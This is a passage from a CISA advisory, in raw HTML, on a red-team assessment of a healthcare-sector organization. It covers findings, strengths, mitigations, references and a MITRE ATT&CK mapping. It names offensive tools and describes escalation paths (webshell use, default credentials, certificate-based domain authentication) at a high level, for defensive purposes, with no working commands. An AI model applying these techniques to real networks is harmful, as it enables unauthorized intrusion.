title=\"Steal or Forge Kerberos Tickets: Golden Ticket\">golden ticket</a> or <a href=\"https://attack.mitre.org/versions/v14/techniques/T1558/002/\" title=\"Steal or Forge Kerberos Tickets: Silver Ticket\">silver ticket</a> attacks.</p>\n<p>Although the assessment team was unable to fully exploit this configuration because they lost access to one of the vulnerable hosts, it could have led to domain compromise under the right circumstances.</p>\n</td>\n</tr><tr><td>\n<p>Cleartext Password Disclosure</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Storing passwords in cleartext is a security risk because malicious actors with access to these files can use them.</p>\n<p>The assessment team identified several unencrypted files on a file share containing passwords for various personal and organizational accounts.</p>\n</td>\n</tr><tr><td>\n<p>Insecure File Shares</p>\n</td>\n<td>\n<p>Medium</p>\n</td>\n<td>\n<p>Penetration Testing</p>\n</td>\n<td>\n<p>Access to sensitive data (e.g., data related to business functions, IT functions, and/or personnel) should be restricted to only certain authenticated and authorized users.</p>\n<p>The assessment team found an unsecured directory on a file share with sensitive IT information. The directory was accessible to all users in the domain group. Malicious actors with user privileges could access and/or exfiltrate this data.</p>\n</td>\n</tr></tbody></table><h5><em>Additional Issues</em></h5>\n<p>The CISA team identified one Informational severity within the organization’s networks and systems. These issues may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment, but are not readily exploitable. The information provided is to encourage the stakeholder to investigate these issues further to adjust their environments or eliminate certain aspects as needed, but the urgency is low.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 5: Informational Issues That CISA Team Noted</em></caption>\n<thead><tr><td><strong>Issue</strong></td>\n<td><strong>Severity</strong></td>\n<td><strong>Service</strong></td>\n<td><strong>Description</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Overly Permissive Accounts</p>\n</td>\n<td>\n<p>  Informational</p>\n</td>\n<td>\n<p> Penetration Testing</p>\n</td>\n<td>\n<p>Account privileges are intended to control user access to host or application resources to limit access to sensitive information in support of a least-privilege security model. When user (or other) accounts have high privileges, users can see and/or do things they normally should not, and malicious actors can exploit this to access host and application resources.</p>\n<p>The assessment team identified Active Directory objects where the <code>Human Resources</code> group appeared to be part of the privileged <code>Account Operators</code> group. This may have provided elevated privileges to accounts in the <code>Human Resources</code> group. (The CISA team was unable to validate and demonstrate the potential impact of this relationship within the assessment period).</p>\n</td>\n</tr></tbody></table><h5><em><strong>Noted Strengths</strong></em></h5>\n<p>The CISA team noted the following business, technical, and administrative components that enhanced the network security posture of the tested environment:</p>\n<ul><li>The organization’s network was found to have several strong, security-oriented characteristics such as:\n<ul><li>Effective antivirus software;</li>\n<li>Endpoint detection and response capabilities;</li>\n<li>Good policies and best practices for protecting users from malicious files including not allowing users to mount ISO files;</li>\n<li>Minimal external attack surface, limiting an adversary’s ability to leverage external vulnerabilities to gain initial access to the organization’s networks and systems;</li>\n<li>Strong wireless protocols;</li>\n<li>And network segmentation.</li>\n</ul></li>\n<li>The organization’s security also demonstrated their ability to detect some of the CISA team's actions throughout testing and overall situational awareness through the use of logs and alerts.</li>\n<li>The organization used MFA for cloud accounts. The assessment team obtained cloud credentials via a phishing campaign but was unable to use them because of MFA prompts.</li>\n</ul><h3><strong>MITIGATIONS</strong></h3>\n<h4><strong>Network Defenders</strong></h4>\n<p>CISA recommends HPH Sector and other critical infrastructure organizations implement the mitigations in Table 6 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 6: Recommendations to Mitigate Identified Issues</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Issue</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Recommendation</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Poor Credential Hygiene: Easily Crackable Passwords</p>\n</td>\n<td>\n<ul><li><strong>Follow National Institute of Standards and Technologies (NIST) <a href=\"https://csrc.nist.gov/publications/detail/sp/800-63b/final\" title=\"Digital Identity Guidelines: Authentication and Lifecycle Management\">guidelines</a> </strong><strong>when creating password policies</strong> to enforce use of “strong” passwords that cannot be cracked [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.B</a><u>]</u>.[<a href=\"https://csrc.nist.gov/pubs/sp/800/63/b/upd2/final\" title=\"Digital Identity Guidelines: Authentication and Lifecycle Management\">11</a>] Consider using password managers to generate and store passwords.</li>\n<li><strong>Use “strong” passphrases for private keys</strong> to make cracking resource intensive [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.B</a><u>]</u>. Do not store credentials within the registry in Windows systems. Establish an organizational policy that prohibits password storage in files.</li>\n<li><strong>Ensure adequate password length (ideally 15+ characters) and complexity requirements for Windows service accounts</strong> and implement passwords with periodic expiration on these accounts [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.B</a>]. Use Managed Service Accounts, when possible, to manage service account passwords automatically.</li>\n</ul></td>\n</tr><tr><td>\n<p>Poor Credential Hygiene: Guessable Credentials</p>\n</td>\n<td>\n<ul><li><strong>Do not reuse local administrator account passwords across systems</strong>. Ensure that passwords are “strong” and unique [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.C</a>].</li>\n<li><strong>Use phishing-resistant multi-factor authentication (MFA) for all administrative access</strong>, including domain administrative access [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.H</a>]. If an organization that uses mobile push-notification-based MFA is unable to implement phishing-resistant MFA, use number matching to mitigate MFA fatigue. For more information, see CISA fact sheets on <a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"mplementing Phishing-Resistant MFA\">Implementing Phishing-Resistant MFA</a> and <a href=\"/sites/default/files/publications/fact-sheet-implement-number-matching-in-mfa-applications-508c.pdf\" title=\"Implementing Number Matching in MFA Applications\">Implementing Number Matching in MFA Applications</a>.</li>\n</ul></td>\n</tr><tr><td>\n<p>Misconfigured ADCS Certificate Templates</p>\n</td>\n<td>\n<ul><li><strong>Restrict enrollment rights in templates to only those users or groups that require it</strong>. Remove the <code>Enrollee Supplies Subject</code> flag from templates if it is not necessary or enforce manager approval if required. Consider removing <code>Write Owner, Write DACL</code> and <code>Write Property</code> permissions from low-privilege groups, such as <code>Authenticated Users</code> where those permissions are not needed.</li>\n</ul></td>\n</tr><tr><td>\n<p>Unnecessary Network Services Enabled</p>\n</td>\n<td>\n<ul><li><strong>Ensure that only ports, protocols, and services with validated business needs are running on each system</strong>. Disable deprecated protocols (including NetBIOS, LLMNR, and mDNS) on the network that are not strictly necessary for business functions, or limit the systems and services that use the protocol, where possible [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.W</a>].</li>\n<li><strong>Disable the </strong><code><strong>WebClient</strong></code><strong> and Spooler services</strong> where possible to minimize risk of coerced authentication.</li>\n<li><strong>Disable ADCS web-enrollment services</strong>. If this service cannot be disabled, disable NTLM authentication to prevent malicious actors from performing NTLM relay attacks or abusing the Spooler and <code>WebClient</code> services to coerce and relay authentication to the web-enrollment service.</li>\n</ul></td>\n</tr><tr><td>\n<p>Elevated Service Account Privileges</p>\n</td>\n<td>\n<ul><li><strong>Run daemon applications using a non-Administrator account</strong> when appropriate.</li>\n<li><strong>Configure Service accounts with only the permissions necessary for the services they operate</strong>.</li>\n<li>To mitigate Kerberoasting attacks, <strong>use AES or stronger encryption</strong> instead of RC4 for Kerberos hashes [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.K</a>]. RC4 is considered weak encryption.</li>\n</ul></td>\n</tr><tr><td>\n<p>SMB Signing Not Enabled</p>\n</td>\n<td>\n<ul><li><strong>Require SMB signing for both SMB client and server on all systems</strong> to prevent certain adversary-in-the-middle and pass-the-hash attacks. See Microsoft’s <a href=\"https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing\" title=\"Overview of Server Message Block signing\">Overview of Server Message Block signing</a> for more information.</li>\n</ul></td>\n</tr><tr><td>\n<p>Insecure Default Configuration: Default Credentials</p>\n</td>\n<td>\n<ul><li><strong>Verify the implementation of appropriate hardening measures, and change, remove, or deactivate all default credentials</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.A</a>].</li>\n<li>Before deploying any new devices in a networked environment, <strong>change all default passwords for applications, operating systems, routers, firewalls, wireless access points, and other systems</strong> to have values consistent with administration-level accounts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.A</a>].</li>\n</ul></td>\n</tr><tr><td>\n<p>Poor Credential Hygiene: Password Reuse for Administrator and User Accounts</p>\n</td>\n<td>\n<ul><li><strong>Discontinue reuse or sharing of administrative credentials</strong> among user/administrative accounts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.C</a>].</li>\n<li><strong>Use unique credentials across workstations</strong>, when possible,<strong> </strong>in accordance with applicable federal standards, industry best practices, and/or agency-defined requirements.</li>\n<li><strong>Train users, especially privileged users, against password reuse</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.I</a>].</li>\n</ul></td>\n</tr><tr><td>\n<p>Poor Credential Hygiene: Password Reuse for Administrator Accounts</p>\n</td>\n<td>\n<ul><li><strong>Discontinue reuse or sharing of administrative credentials among systems </strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.C</a>]. When possible, use unique credentials across all workstations in accordance with applicable federal standards, industry best practices, and/or agency-defined requirements.</li>\n<li><strong>Implement a security awareness program</strong> that focuses on the methods commonly used in intrusions that can be blocked through individual action [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.I</a>].</li>\n<li><strong>Implement Local Administrator Password Solution (LAPS)</strong> where possible if your OS is older than Windows Server 2019 and Windows 10 as these versions do not have LAPS built in. <strong>Note:</strong> The authoring organizations recommend organizations upgrade to Windows Server 2019 and Windows 10 or greater.</li>\n</ul></td>\n</tr><tr><td>\n<p>Poor Patch Management: Out-of-Date Software</p>\n</td>\n<td>\n<ul><li><strong>Enforce consistent patch management</strong> across all systems and hosts within the network environment [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 1.E</a>].</li>\n<li>Where patching is not possible due to limitations, <strong>implement network segregation controls</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.F</a>] to limit exposure of the vulnerable system or host.</li>\n<li><strong>Consider deploying automated patch management tools and software update tools</strong> for operating system and software/applications on all systems for which such tools are available and safe.</li>\n</ul></td>\n</tr><tr><td>\n<p>Poor Patch Management: Unsupported OS or Application</p>\n</td>\n<td>\n<ul><li><strong>Evaluate the use of unsupported hardware and software and discontinue</strong> where possible. If discontinuing the use of unsupported hardware and software is not possible, implement additional network protections to mitigate the risk.</li>\n</ul></td>\n</tr><tr><td>\n<p>Use of Weak Authentication Measures</p>\n</td>\n<td>\n<ul><li><strong>Require phishing-resistant MFA for all user accounts that have access to sensitive data or systems</strong>. If MFA is not possible, it is recommended to, at a minimum, configure a more secure password policy by aligning with guidelines put forth by trusted entities such as NIST [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.H</a>].</li>\n</ul></td>\n</tr><tr><td>\n<p>PII Disclosure</p>\n</td>\n<td>\n<ul><li><strong>Implement a process to review files and systems for insecure handling of PII </strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.L</a>].<strong> </strong>Properly secure or remove the information. Conduct periodic scans of server machines using automated tools to determine whether sensitive data (e.g., personally identifiable information, health, credit card, or classified information) is present on the system in cleartext.</li>\n<li><strong>Encrypt PII and other sensitive data</strong>, and train users who handle sensitive data to utilize best practices for encrypting data and storing it securely. If sensitive data must be stored on shares or other locations, restrict access to these locations as much as possible through access controls and network segmentation [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.F, 2.K, 2.L</a>].</li>\n</ul></td>\n</tr><tr><td>\n<p>Hosts with Unconstrained Delegation Enabled Unnecessarily</p>\n</td>\n<td>\n<ul><li><strong>Remove </strong><code><strong>Unconstrained Delegation</strong></code><strong> from all servers</strong>. If <code>Unconstrained Delegation</code> functionality is required, upgrade operating systems and applications to leverage other approaches (e.g., configure <code>Constrained Delegation</code>, enable the <code>Account is sensitive and cannot be delegated</code> option) or explore whether systems can be retired or further isolated from the enterprise. CISA recommends Windows Server 2019 or greater.</li>\n</ul></td>\n</tr><tr><td>\n<p>Cleartext Password Disclosure</p>\n</td>\n<td>\n<ul><li><strong>Implement a review process for files and systems to look for cleartext account credentials</strong>. When credentials are found, remove or change them to maintain security [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.L</a>].</li>\n<li><strong>Conduct periodic scans of server machines using automated tools to determine whether sensitive data</strong> (e.g., personally identifiable information, health, credit card, or classified information) is present on the system in cleartext. Consider implementing a secure password manager solution in cases where passwords need to be stored [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.L</a>].</li>\n</ul></td>\n</tr><tr><td>\n<p>Insecure File Shares</p>\n</td>\n<td>\n<ul><li><strong>Restrict access to file shares containing sensitive data</strong> to only certain authenticated and authorized users [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.L</a>].</li>\n</ul></td>\n</tr></tbody></table><p>Additionally, CISA recommends that HPH sector organizations implement the following strategies to mitigate cyber threats:</p>\n<ul><li><strong>Mitigation Strategy #1 Asset Management and Security:</strong>\n<ul><li>CISA recommends that HPH sector organizations implement and maintain an asset management policy to reduce the risk of exposing vulnerabilities, devices, or services that could be exploited by threat actors to gain unauthorized access, steal sensitive data, or disrupt critical services. The focus areas for this mitigation strategy include asset management and asset security, addressing asset inventory, procurement, decommissioning, and network segmentation as they relate to hardware, software, and data assets.</li>\n</ul></li>\n<li><strong>Mitigation Strategy #2 Identity Management and Device Security:</strong>\n<ul><li>CISA recommends entities secure their devices and digital accounts and manage their online access to protect sensitive data and PII/PHI from compromise. The focus areas for this mitigation strategy include email security, phising prevention, access management, password policies, data protection and loss prevention, and device logs and monitoring solutions.</li>\n</ul></li>\n<li><strong>Mitigation Strategy #3 Vulnerability, Patch, and Configuration Management:</strong>\n<ul><li>CISA recommends entities mitigate known vulnerabilities and establish secure configuration baselines to reduce the likelihood of threat actors exploiting known vulnerabilities to breach organizational networks. The focus areas for this mitigation strategy include vulnerability and patch Management, and configuration and change management.</li>\n</ul></li>\n</ul><p>For more information on these mitigations strategies, see CISA’s <a href=\"https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/healthcare-and-public-health-sector\" title=\"Healthcare and Public Health Sector\">Healthcare and Public Health Sector</a> webpage.</p>\n<h4><strong>Software Manufacturers</strong></h4>\n<p>The above mitigations apply to HPH sector and other critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of the majority of these flaws, and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team:</p>\n<ul><li><strong>Embed security into product architecture throughout the</strong> <strong>entire</strong> software development lifecycle (SDLC).</li>\n<li><strong>Eliminate default passwords</strong>. Do not provide software with default passwords. To eliminate default passwords, require administrators set a “strong” password [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.B</a>] during installation and configuration.</li>\n<li><strong>Create secure configuration templates</strong>. Provide configuration templates with certain safe settings based on an organization’s risk appetite (e.g., low, medium, and high security templates). Support these templates with hardening guides based on the risks the manufacturer has identified. The default configuration should be a secure one, and organizations should need to opt in if they desire a less secure configuration.</li>\n<li><strong>Design products so that the compromise of a single security control does not result in compromise of the entire system</strong>. For example, narrowly provision user privileges by default and employ ACLs to reduce the impact of a compromised account. This will make it more difficult for a malicious cyber actor to escalate privileges and move laterally.</li>\n<li><strong>Mandate MFA, </strong><a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\"><strong>ideally phishing-resistant MFA</strong></a><strong>, for privileged users</strong> and make MFA a default, rather than opt-in, feature.</li>\n</ul><p>These mitigations align with tactics provided in the joint guide <a href=\"/sites/default/files/2023-10/Shifting-the-Balance-of-Cybersecurity-Risk-Principles-and-Approaches-for-Secure-by-Design-Software.pdf\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.</p>\n<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see the joint advisory <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a\" title=\"NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations\">NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations</a>.</p>\n<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying the listed mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Tables 7 – 16).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>RESOURCES</strong></h3>\n<ul><li>For consolidated findings from the RVAs by Fiscal Year mapped to MITRE ATT&amp;CK, see CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/risk-and-vulnerability-assessments\" title=\"Risk and Vulnerability Assessments\">Risk and Vulnerability Assessments</a> page.</li>\n<li>See joint CSA <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a\" title=\"NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations\">NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations</a> for information on the most common cybersecurity misconfigurations in large organizations and TTPs actors use to exploit these misconfigurations.</li>\n<li>See CISA’s <a href=\"https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/healthcare-and-public-health-sector\" title=\"Healthcare and Public Health Sector\">Healthcare and Public Health Sector</a> webpage.</li>\n<li>See CISA’s <a href=\"https://github.com/cisagov/RedEye/\" title=\"cisagov / RedEye\">RedEye tool on CISA’s GitHub page</a>. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s <a href=\"https://www.youtube.com/watch?v=b_ARIVl4BkQ\" title=\"Redeye - Visualizing Penetration Testing Engagements\">RedEye tool overview video</a> for more information.</li>\n</ul><h3><strong>REFERENCES</strong></h3>\n<p>[1]   <a href=\"https://github.com/kgretzky/evilginx\" title=\"kgretzky / evilginx\">Github | kgretzky / evilginx</a><br />\n[2]   <a href=\"https://github.com/lgandx/Responder\" title=\"lgandx / Responder\">Github | lgandx / Responder</a><br />\n[3]   <a href=\"https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level\" title=\"Network security: LAN Manager authentication level\">Network security LAN Manager authentication level - Windows Security | Microsoft Learn</a><br />\n[4]   <a href=\"https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names\" title=\"Service principal names\">Service principal names - Win32 apps | Microsoft Learn</a><br />\n[5]   <a href=\"https://github.com/fortra/impacket\" title=\"fortra / impacket\">Github | fortra / impacket</a><br />\n6]   <a href=\"https://github.com/byt3bl33d3r/CrackMapExec\" title=\"byt3bl33d3r / CrackMapExec\">Github | byt3bl33d3r / CrackMapExec</a><br />\n[7]   <a href=\"https://github.com/ly4k/Certipy\" title=\"ly4k / Certipy\">Github | ly4k / Certipy</a><br />\n[8]   <a href=\"https://github.com/topotam/PetitPotam\" title=\"topotam / PetitPotam\">Github | topotam / PetitPotam</a><br />\n[9]   <a href=\"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\" title=\"fortra / impacket / examples\">Github | fortra / impacket / examples</a><br />\n[10] <a href=\"https://github.com/login-securite/DonPAPI\" title=\"login-securite / DonPAPI\">Github | login-securite / DonPAPI</a><br />\n[11] <a href=\"https://csrc.nist.gov/pubs/sp/800/63/b/upd2/final\" title=\"Digital Identity Guidelines: Authentication and Lifecycle Management\">SP 800-63B, Digital Identity Guidelines: Authentication and Lifecycle Management | CSRC (nist.gov)</a></p>\n<h3><strong>APPENDIX: MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 7: CISA Team ATT&amp;CK Techniques for Reconnaissance</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Reconnaissance</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>Active Scanning: Scanning IP Blocks</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1595/001/\" title=\"Active Scanning: Scanning IP Blocks\">T1595.001</a></p>\n</td>\n<td>\n<p>The CISA team first mapped the network to identify open web ports.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 8: CISA Team ATT&amp;CK Techniques for Initial Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Initial Access</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><td>\n<p><strong>Technique Title</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr><tr><td>\n<p>Valid Accounts: Default Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/001/\" title=\"Valid Accounts: Default Accounts\">T1078.001</a></p>\n</td>\n<td>\n<p>The CISA team did identify default credentials for multiple web interfaces during web application testing and used default printer credentials while penetration testing.</p>\n</td>\n</tr><tr><td>\n<p>External Remote Services</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a></p>\n</td>\n<td>\n<p>The CISA team attempted to access various web interfaces with default administrator credentials.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 9: CISA Team ATT&amp;CK Techniques for Execution</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Execution</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>Command-Line Interface</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/\" title=\"Command-Line Interface\">T1059</a></p>\n</td>\n<td>\n<p>The CISA team accessed a virtual machine interface enabling them to modify, power off, and/or delete critical virtual machines including domain controllers, file servers, and servers.</p>\n</td>\n</tr><tr><td>\n<p>Command and Scripting Interpreter: Windows Command Shell</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/003/\" title=\"Command and Scripting Interpreter: Windows Command Shell\">T1059.003</a></p>\n</td>\n<td>\n<p>The CISA team used a webshell that allowed them to execute commands under the context of the local <code>SYSTEM</code> account.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 10: CISA Team ATT&amp;CK Techniques for Privilege Escalation</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Privilege Escalation</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>Valid Accounts: Domain Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></p>\n</td>\n<td>\n<p>The CISA team used CrackMapExec to use ACCOUNT 1 to successfully connect to a domain controller (DC).</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 11: CISA Team ATT&amp;CK Techniques for Defense Evasion</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Defense Evasion</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr><tr><td>\n<p>Use Alternate Authentication Material</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1550/\" title=\"Use Alternate Authentication Material\">T1550</a></p>\n</td>\n<td>\n<p>The CISA team authenticated to the domain controller as ACCOUNT 3 with the generated certificate.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 12: CISA Team ATT&amp;CK Techniques for Credential Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Credential Access</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n<th scope=\"col\" role=\"columnheader\"> </th>\n</tr></thead><tbody><tr><th role=\"columnheader\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th 